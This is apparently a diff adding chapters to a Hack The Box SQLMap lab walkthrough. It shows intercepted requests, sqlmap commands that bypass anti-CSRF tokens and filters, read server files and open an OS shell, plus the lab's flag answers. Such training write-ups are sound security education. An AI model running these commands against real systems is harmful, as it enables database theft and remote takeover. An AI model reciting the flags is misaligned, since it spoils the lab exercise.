@@ -9,6 +9,9 @@
 3. [Database Enumeration](#database-enumeration)
     1. [Database Enumeration](#database-enumeration-1)
     2. [Advanced Database Enumeration](#advanced-database-enumeration)
+4. [Advanced SQLMap Usage](#advanced-sqlmap-usage)
+    1. [Bypassing Web Application Protections](#bypassing-web-application-protections)
+    2. [OS Exploitation](#os-exploitation)
 
 ## Getting Started
 ### SQLMap Overview
@@ -269,3 +272,180 @@
     ![alt text](<Assets/Advanced Database Enumeration - 3.png>)
 
     The answer is `Enizoom1609`.
+
+## Advanced SQLMap Usage
+### Bypassing Web Application Protections
+#### Challenges
+1. What's the contents of table flag8? (Case #8)
+
+    Here the burpsuite intercepted request:
+
+    ```txt
+    POST /case8.php HTTP/1.1
+    Host: 94.237.123.185:35160
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: http://94.237.123.185:35160/case8.php
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 52
+    Origin: http://94.237.123.185:35160
+    DNT: 1
+    Connection: keep-alive
+    Cookie: PHPSESSID=r9llsporqct9pmdcvaang25c8r
+    Upgrade-Insecure-Requests: 1
+    Sec-GPC: 1
+    Priority: u=0, i
+
+    id=1&t0ken=T6ouyai0c3qpMxIHqCRVf4PNAlTaUgzLhQXUCfPr4
+    ```
+    The challenge has given us information that we need to do **Anti-CSRF Token Bypass**. We can use `--csrf-token` flag. What is CSRF mean? what is the different without it? Here the answer:
+
+    ![alt text](<Assets/Bypassing Web Application Protections - 1.png>)
+
+    Here the **SQLMAP** command:
+
+    ```bash
+    sqlmap -r req.txt -T flag8 --csrf-token="t0ken" --dump --batch --no-cast
+    ```
+    The answer is `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}`.
+
+2. What's the contents of table flag9? (Case #9)
+
+    Here the burpsuite intercepted request.
+    ```txt
+    GET /case9.php?id=1&uid=2411273799 HTTP/1.1
+    Host: 94.237.123.185:35160
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: http://94.237.123.185:35160/case9.php
+    DNT: 1
+    Connection: keep-alive
+    Cookie: PHPSESSID=r9llsporqct9pmdcvaang25c8r
+    Upgrade-Insecure-Requests: 1
+    Sec-GPC: 1
+    Priority: u=0, i
+    ```
+    The concept is similar to the previous. But instead of randomize a token, we need to do randomize the value.
+
+    ```bash
+    sqlmap -r req.txt -T flag9 --randomize="uid" --dump --batch --no-cast
+    ```
+    The answer is `HTB{700_much_r4nd0mn355_f0r_my_74573}`.
+
+3. What's the contents of table flag10? (Case #10)
+
+    Here the burpsuite intercepted request.
+
+    ```txt
+    POST /case10.php HTTP/1.1
+    Host: 94.237.123.185:35160
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: http://94.237.123.185:35160/case10.php
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Origin: http://94.237.123.185:35160
+    DNT: 1
+    Connection: keep-alive
+    Cookie: PHPSESSID=r9llsporqct9pmdcvaang25c8r
+    Upgrade-Insecure-Requests: 1
+    Sec-GPC: 1
+    Priority: u=0, i
+
+    id=1
+    ```
+    I can solve it by using standard sqlmap command.
+
+    ```bash
+    sqlmap -r req.txt -T flag10 --dump --batch --no-cast
+    ```
+    The answer is `HTB{y37_4n07h3r_r4nd0m1z3}`.
+
+4. What's the contents of table flag11? (Case #11)
+
+    Here the burpsuite intercepted request.
+
+    ```txt
+    GET /case11.php?id=1 HTTP/1.1
+    Host: 94.237.123.185:35160
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: http://94.237.123.185:35160/case11.php
+    DNT: 1
+    Connection: keep-alive
+    Cookie: PHPSESSID=r9llsporqct9pmdcvaang25c8r
+    Upgrade-Insecure-Requests: 1
+    Sec-GPC: 1
+    Priority: u=0, i
+    ```
+    First i trie to run by using standard sqlmap command.
+
+    ```bash
+    sqlmap -r req.txt -T flag11 --dump --batch --no-cast
+    ```
+    But i got this.
+
+    ![alt text](<Assets/Bypassing Web Application Protections - 2.png>)
+
+    So i rerun again with **--tamper=between**. Here the full command:
+
+    ```bash
+    sqlmap -r req.txt -T flag11 --dump --batch --no-cast --tamper=between
+    ```
+    The answer is `HTB{5p3c14l_ch4r5_n0_m0r3}`.
+
+### OS Exploitation
+#### Challenges
+1. Try to use SQLMap to read the file "/var/www/html/flag.txt".
+
+    Here the burpsuite intercepted request.
+
+    ```txt
+    GET /?id=1 HTTP/1.1
+    Host: 94.237.50.128:50747
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Referer: http://94.237.50.128:50747/
+    DNT: 1
+    Connection: keep-alive
+    Upgrade-Insecure-Requests: 1
+    Sec-GPC: 1
+    Priority: u=0, i
+    ```
+    We need to confirm that we have previllege to read local file.
+
+    ```bash
+    sqlmap -r req.txt --is-dba
+    ```
+    ![alt text](<Assets/OS Exploitation - 1.png>)
+
+    It confirmed. Now we can use this command to read the flag:
+
+    ```bash
+    sqlmap -r req.txt --file-read /var/www/html/flag.txt
+    ```
+    The answer is `HTB{5up3r_u53r5_4r3_p0w3rful!}`.
+
+2. Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.
+
+    I tried to run this command but something wrong.
+
+    ```bash
+    sqlmap -r req.txt --os-shell
+    ```
+    So i specify the technique and it is work.
+
+    ```bash
+    sqlmap -r req.txt --os-shell --technique=E
+    ```
+    The answer is `HTB{n3v3r_run_db_45_db4}`.
